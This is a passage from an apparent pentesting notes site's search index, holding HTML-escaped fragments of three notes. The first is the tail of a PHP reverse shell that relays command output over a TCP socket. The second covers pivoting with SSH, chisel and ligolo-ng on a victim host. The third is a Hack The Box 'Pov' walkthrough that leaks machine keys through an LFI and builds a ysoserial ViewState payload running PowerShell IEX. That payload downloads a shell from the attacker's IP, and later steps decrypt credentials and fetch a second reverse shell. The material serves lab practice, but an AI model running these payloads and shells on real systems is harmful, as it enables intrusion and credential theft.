class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;SOCK: \u003c/span\u003e\u003cspan class=\"si\"\u003e$input\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"nx\"\u003efwrite\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$pipes\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e],\u003c/span\u003e \u003cspan class=\"nv\"\u003e$input\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"c1\"\u003e// If we can read from the process\u0026#39;s STDOUT\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e\t\u003cspan class=\"c1\"\u003e// send data down tcp connection\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e\t\u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ein_array\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$pipes\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e],\u003c/span\u003e \u003cspan class=\"nv\"\u003e$read_a\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$debug\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"nx\"\u003eprintit\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;STDOUT READ\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"nv\"\u003e$input\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003efread\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$pipes\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e],\u003c/span\u003e \u003cspan class=\"nv\"\u003e$chunk_size\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$debug\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"nx\"\u003eprintit\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;STDOUT: \u003c/span\u003e\u003cspan class=\"si\"\u003e$input\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"nx\"\u003efwrite\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$sock\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nv\"\u003e$input\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"c1\"\u003e// If we can read from the process\u0026#39;s STDERR\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e\t\u003cspan class=\"c1\"\u003e// send data down tcp connection\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e\t\u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ein_array\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$pipes\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e2\u003c/span\u003e\u003cspan class=\"p\"\u003e],\u003c/span\u003e \u003cspan class=\"nv\"\u003e$read_a\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$debug\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"nx\"\u003eprintit\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;STDERR READ\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"nv\"\u003e$input\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003efread\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$pipes\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e2\u003c/span\u003e\u003cspan class=\"p\"\u003e],\u003c/span\u003e \u003cspan class=\"nv\"\u003e$chunk_size\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$debug\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"nx\"\u003eprintit\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;STDERR: \u003c/span\u003e\u003cspan class=\"si\"\u003e$input\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"nx\"\u003efwrite\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$sock\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nv\"\u003e$input\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nx\"\u003efclose\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$sock\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nx\"\u003efclose\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$pipes\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e]);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nx\"\u003efclose\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$pipes\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e]);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nx\"\u003efclose\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$pipes\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e2\u003c/span\u003e\u003cspan class=\"p\"\u003e]);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nx\"\u003eproc_close\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$process\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e// Like print, but does nothing if we\u0026#39;ve daemonised ourself\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e// (I can\u0026#39;t figure out how to redirect STDOUT like a proper daemon)\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e\u003cspan class=\"k\"\u003efunction\u003c/span\u003e \u003cspan class=\"nf\"\u003eprintit\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$string\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"o\"\u003e!\u003c/span\u003e\u003cspan class=\"nv\"\u003e$daemon\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"k\"\u003eprint\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"si\"\u003e$string\\n\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e?\u0026gt;\u003c/span\u003e\u003cspan class=\"err\"\u003e \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e","tags":[],"title":"Php-Monkey"},{"content":"Port forwarding ssh Option -L (Local Port Forwarding) Syntaxe : ssh -L [port_local]:[host_remote]:[port_remote] [utilisateur]@[hôte] Usage : Redirige un port de votre machine locale vers un port sur la machine distante. Exemple : ssh -L 4000:127.0.0.1:3000 johndoe@192.168.1.100 Option -R (Remote Port Forwarding) Syntaxe : ssh -R [port_remote]:[host_local]:[port_local] [utilisateur]@[hôte]\nUsage : Redirige un port de la machine distante vers un port sur votre machine locale. - Exemple : ssh -R 4000:127.0.0.1:3000 johndoe@192.168.1.100\nssh -R1080: pentest@10.0.1.26 -N Chisel / Proxychain Get the binary : wget https://github.com/jpillora/chisel/releases/download/v1.10.0/chisel_1.10.0_linux_amd64.gz wget https://github.com/jpillora/chisel/releases/download/v1.10.0/chisel_1.10.0_windows_amd64.gz\rAdds a line to /etc/proxychains4.conf to be able to use proxychains:\nsocks5 127.0.0.1 1080\rDownload the binary on the remote host and then : # On your local machine ./chisel server -p 8888 -reverse \u0026amp;\r# On the remote host ./chisel client 10.8.3.12:8888 R:1080:socks \u0026amp;\rproxychains -q nmap -sT localhost\rLigolo-ng Proxy : https://github.com/nicocha30/ligolo-ng/releases/download/v0.6.2/ligolo-ng_proxy_0.6.2_linux_amd64.tar.gz Agent_windows : https://github.com/nicocha30/ligolo-ng/releases/download/v0.6.2/ligolo-ng_agent_0.6.2_windows_amd64.zip or Agent_linux : https://github.com/nicocha30/ligolo-ng/releases/download/v0.6.2/ligolo-ng_agent_0.6.2_linux_amd64.tar.gz\rSetup Ligolo-ng : Start the proxy server on your Command and Control (C2) server (default 11601 listening will be use): sudo ip tuntap add user p4v1c mode tun ligolo sudo ip link set ligolo up ./proxy -selfcert\rStart the agent on your target (victim) computer (no privileges are required!): ./agent.exe -connect 10.8.3.12:11601 -ignore-cert\rUse the session command to select the agent.\nligolo-ng » session ? Specify a session : 1 - nchatelain@nworkstation - XX.XX.XX.XX:38000\rDisplay the network configuration of the agent using the ifconfig command: Add a route on the proxy/relay server to the 192.168.0.0/24 agent network :\nsudo ip route add 10.10.11.0/24 dev ligolo start\rClean : sudo ip link set dev ligolo down sudo ip tuntap del dev ligolo mode tun\r","date":"2023-09-07","id":87,"permalink":"/notes/ad/pivot/","summary":"\u003ch2 id=\"port-forwarding-ssh\"\u003ePort forwarding ssh\u003c/h2\u003e\n\u003ch5 id=\"option--l-local-port-forwarding\"\u003eOption \u003ccode\u003e-L\u003c/code\u003e (Local Port Forwarding)\u003c/h5\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eSyntaxe\u003c/strong\u003e : \u003ccode\u003essh -L [port_local]:[host_remote]:[port_remote] [utilisateur]@[hôte]\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eUsage\u003c/strong\u003e : Redirige un port de votre machine locale vers un port sur la machine distante.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eExemple\u003c/strong\u003e : \u003ccode\u003essh -L 4000:127.0.0.1:3000 johndoe@192.168.1.100\u003c/code\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch5 id=\"option--r-remote-port-forwarding\"\u003eOption \u003ccode\u003e-R\u003c/code\u003e (Remote Port Forwarding)\u003c/h5\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eSyntaxe\u003c/strong\u003e : \u003ccode\u003essh -R [port_remote]:[host_local]:[port_local] [utilisateur]@[hôte]\u003c/code\u003e\u003c/p\u003e","tags":[],"title":"Pivot"},{"content":"#SeDebugPrivilege #iis #viewstate\nScan : nmap -Pn -sC -sV -p- -T 5 10.10.11.251\rOutput(Got nothing) : PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 10.0 |_http-stored-xss: Couldn\u0026#39;t find any stored XSS vulnerabilities. |_http-server-header: Microsoft-IIS/10.0 |_http-dombased-xss: Couldn\u0026#39;t find any DOM based XSS. | http-fileupload-exploiter: | |_ Couldn\u0026#39;t find a file-type field. |_http-csrf: Couldn\u0026#39;t find any CSRF vulnerabilities. Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows\rDirectory and file enumeration (Got nothing): ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt:FUZZ -u http://10.10.11.251/FUZZ -recursion -recursion-depth 1 -e .php,.config,.aspx,asp -v\rSubdomain enumeration(Got nothing) : ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt:FUZZ -u https://FUZZ.pov.htb/\rVhost enumeration: ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt:FUZZ -u http://pov.htb/ -H \u0026#39;Host: dev.pov.htb\u0026#39; -fs 1233\rGot \u0026quot;dev\u0026quot;\nRe directory and files enumeration : ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt:FUZZ -u http://pov.htb/FUZZ -recursion -recursion-depth 1 -e .php,.config,.aspx,asp -H \u0026#39;Host: dev.pov.htb\u0026#39; -fw 9\rInteresting content : `Exploiting the download field to download file and download the file web.config with an LFI ..\\web.config \u0026lt;configuration\u0026gt; \u0026lt;system.web\u0026gt; \u0026lt;customErrors mode=\u0026#34;On\u0026#34; defaultRedirect=\u0026#34;default.aspx\u0026#34; /\u0026gt; \u0026lt;httpRuntime targetFramework=\u0026#34;4.5\u0026#34; /\u0026gt; \u0026lt;machineKey decryption=\u0026#34;AES\u0026#34; decryptionKey=\u0026#34;74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43\u0026#34; validation=\u0026#34;SHA1\u0026#34; validationKey=\u0026#34;5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468\u0026#34; /\u0026gt; \u0026lt;/system.web\u0026gt; \u0026lt;system.webServer\u0026gt; \u0026lt;httpErrors\u0026gt; \u0026lt;remove statusCode=\u0026#34;403\u0026#34; subStatusCode=\u0026#34;-1\u0026#34; /\u0026gt; \u0026lt;error statusCode=\u0026#34;403\u0026#34; prefixLanguageFilePath=\u0026#34;\u0026#34; path=\u0026#34;http://dev.pov.htb:8080/portfolio\u0026#34; responseMode=\u0026#34;Redirect\u0026#34; /\u0026gt; \u0026lt;/httpErrors\u0026gt; \u0026lt;httpRedirect enabled=\u0026#34;true\u0026#34; destination=\u0026#34;http://dev.pov.htb/portfolio\u0026#34; exactDestination=\u0026#34;false\u0026#34; childOnly=\u0026#34;true\u0026#34; /\u0026gt; \u0026lt;/system.webServer\u0026gt; \u0026lt;/configuration\u0026gt;\rGain RCE thanks to viewstate and the web.config : https://blog.liquidsec.net/2021/06/01/asp-net-cryptography-for-pentesters/\nGenerate the Payload :\nysoserial.exe -p ViewState -g TextFormattingRunProperties -c \u0026#34;powershell IEX (New-Object Net.WebClient).DownloadString(\u0026#39;http://10.10.15.18:8080/shell.ps1\u0026#39;) \u0026#34; --decryptionalg=\u0026#34;AES\u0026#34; --decryptionkey=\u0026#34;74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43\u0026#34; --validationalg=\u0026#34;SHA1\u0026#34; --validationkey=\u0026#34;5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468\u0026#34; --path=\u0026#34;/portfolio/default.aspx\u0026#34;\rPayload : Tmr%2FEu26m6Npj1v3UANlXqgDCMVMPGilbDr%2BmFVUwpCYlpPna6906W9V46Yy589eKDvEdgZigdd11TRy%2FQCDrXH7y8z%2BrIj%2BRpNDfQ%2FF7hqamdDRYToO12kmUzL354tdqoBGwvs%2Fb%2BLbSW5H4VFBZUamtF88XUD55rA08noF0mMUEUDLymiO1BogrdzrVWiARSYfBTKRJYOwryaFZ5XyD1dgSbslqXfJEx%2BtTCDhDLVSLIbRN4%2BM%2FJoq5cyFClkp8ROn0SGoHFSk2cTWXVzqyM2tagZkpwjCUadmFPtDtNjFmBclIkuRNdglpZKVCgxS5rzAaqocVsAjCvEgn%2FFET1EsnM8UEuMZTkakN00b3RmksNg3V7qUex12F7OMLG%2FYp6Jm%2FEYzVAnEFQliVyvTKoK5nkB2q3gTPaBo1r3FbqXRe3SFrCWVxizkK2%2FaW3OMyN6oQGbW6lJNAmQWxNBb4cokTqV2KRoxqcEnynfMaRnJTki7Nyz2ukqFQwcYYHgQlVodMyAF0eAB9bxi%2FhbLOJWhlZlTpOxQj%2FOZn2qIkrWLCUMDoPjq60HZ4A3k68w9MhmMFAFPBGK5%2BMrtUqDhXY6XH1FK9a9jEQpmD1JFGnA2EMNwhlfUpLVTlCTh3XvCdmcXvDFHv2qiBy0UOH0oXjSxivkocYehsfNne85zxt3WYTsdVKrSwT%2FVSZ6Gf%2FOzI24UV6n7BBFRIIPzRTgkFdcTWeyR3qcJwHyhYJSOQF7KLXr43x7RGFPDPxTs1KTyfK3cuo0vWyg0BlSG74UcRuKjD49hLDsyqF4fRsXIKPoH%2F7HOi1oAmpmcnl%2B1h6J0Uecgm2d5ELlCkG5XvwPUyJtRLtyFSKJaa6W627%2B%2FbbDbSQcNvMFFk2IOmqVZmKpgVVME%2BUNxaKqng1FC7lKjbSafu2wxqKRWgq0aW9JCVJKAPeuL%2BFQDtVYpokFWAhtBKI6x5hl4E1i6g895gz8ipvB291KKKf03oeRKZeYqW8nKU1hKw%2F2uq9tpoMTjY5LR0VYuCWmyztD1DBrxW66T3d7cohCEDx%2F8NQb%2BbyWFtNNLj%2BlciLkeBsMwqY%2FnIutenJ2jMPjKjy%2FKB0fWLvRy1GktVWpK8TwMbs62O3UHOvNRCGI0tYgxOVqWdu%2FSNzcMIc7VXyFaPbeVA8azcQMajp%2BZWr7DFqcT41psy5daDe6BmeM2mCq4C%2F4TOAd87W%2BLJOypcHqFQ0iVT8eKgvK6sgLRZXvAu1hdRnmCgyphpSTxdOutK7di9Hox45uSzI4IoVxVQEOJ%2BwduD4s%2BFX5OkExzWyKwnE3YKqiIXS6U2CGfkgJUg8kpXpcV6ZqsX5t9AxZQR8ZZaRyxt6qE%2Fh6iH3LpGz%2BqwgBuGPJPJwzeedWhjhz03e%2FrUMko9UzawOU1ycQrsw%3D%3D\rCredential user : \u0026lt;Objs Version=\u0026#34;1.1.0.1\u0026#34; xmlns=\u0026#34;http://schemas.microsoft.com/powershell/2004/04\u0026#34;\u0026gt; \u0026lt;Obj RefId=\u0026#34;0\u0026#34;\u0026gt; \u0026lt;TN RefId=\u0026#34;0\u0026#34;\u0026gt; \u0026lt;T\u0026gt;System.Management.Automation.PSCredential\u0026lt;/T\u0026gt; \u0026lt;T\u0026gt;System.Object\u0026lt;/T\u0026gt; \u0026lt;/TN\u0026gt; \u0026lt;ToString\u0026gt;System.Management.Automation.PSCredential\u0026lt;/ToString\u0026gt; \u0026lt;Props\u0026gt; \u0026lt;S N=\u0026#34;UserName\u0026#34;\u0026gt;alaading\u0026lt;/S\u0026gt; \u0026lt;SS N=\u0026#34;Password\u0026#34;\u0026gt;01000000d08c9ddf0115d1118c7a00c04fc297eb01000000cdfb54340c2929419cc739fe1a35bc88000000000200000000001066000000010000200000003b44db1dda743e1442e77627255768e65ae76e179107379a964fa8ff156cee21000000000e8000000002000020000000c0bd8a88cfd817ef9b7382f050190dae03b7c81add6b398b2d32fa5e5ade3eaa30000000a3d1e27f0b3c29dae1348e8adf92cb104ed1d95e39600486af909cf55e2ac0c239d4f671f79d80e425122845d4ae33b240000000b15cd305782edae7a3a75c7e8e3c7d43bc23eaae88fde733a28e1b9437d3766af01fdf6f2cf99d2a23e389326c786317447330113c5cfa25bc86fb0c6e1edda6\u0026lt;/SS\u0026gt; \u0026lt;/Props\u0026gt; \u0026lt;/Obj\u0026gt; \u0026lt;/Objs\u0026gt;\rDecrypt the password : $credential = Import-CliXml -Path connection.xml $credential.GetNetworkCredential().Password \u0026#34;alaading\u0026#34;:\u0026#34;f8gQ8fynP44ek1m3\u0026#34;\rDownload second shell: run.exe alaading f8gQ8fynP44ek1m3 \u0026#34;cmd /c curl -o c:/users/alaading/desktop/shell2.exe http://10.10.15.18:8080/reverse2.exe \u0026#34;\rRun as the new user : run.exe alaading f8gQ8fynP44ek1m3 \u0026#34;cmd /c c:\\users\\alaading\\desktop\\shell2.exe\u0026#34;\rEnable all privileges : Import-Module .\\Enable-Privilege.ps1 .\\EnableAllTokenPrivs.ps1\rMigrate the process with the meterpreter : ps migrate 672\r","date":"2023-09-07","id":88,"permalink":"/notes/lab/htb/pov/","summary":"\u003cp\u003e#SeDebugPrivilege #iis #viewstate\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eScan :\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enmap -Pn -sC -sV -p- -T \u003cspan class=\"m\"\u003e5\u003c/span\u003e 10.10.11.251\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cul\u003e\n\u003cli\u003eOutput(Got nothing) :\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ePORT   STATE SERVICE VERSION\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e80/tcp open  http    Microsoft IIS httpd 10.0\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_http-stored-xss: Couldn\u003cspan class=\"s1\"\u003e\u0026#39;t find any stored XSS vulnerabilities.\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e|_http-server-header: Microsoft-IIS/10.0\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e|_http-dombased-xss: Couldn\u0026#39;\u003c/span\u003et find any DOM based XSS.\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e 